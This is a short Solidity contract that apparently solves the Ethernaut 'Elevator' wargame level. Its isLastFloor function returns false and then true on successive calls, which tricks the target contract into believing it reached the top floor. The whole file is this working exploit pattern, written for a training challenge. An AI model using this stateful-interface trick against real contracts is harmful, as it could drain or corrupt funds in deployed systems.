pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint) external;
}

contract Building {
    
    bool public used = false;
    //Where yourAddress is the targeted address instance you get from Ethernaut
    Elevator elev = Elevator(yourAddress);
    
    function isLastFloor(uint floor) public returns (bool) {
        if (used == false) {
            used = true;
            return (false);
        }
        else
            return (true);
    }
    
    function callElevator(uint floor) public {
        elev.goTo(floor);
    }
}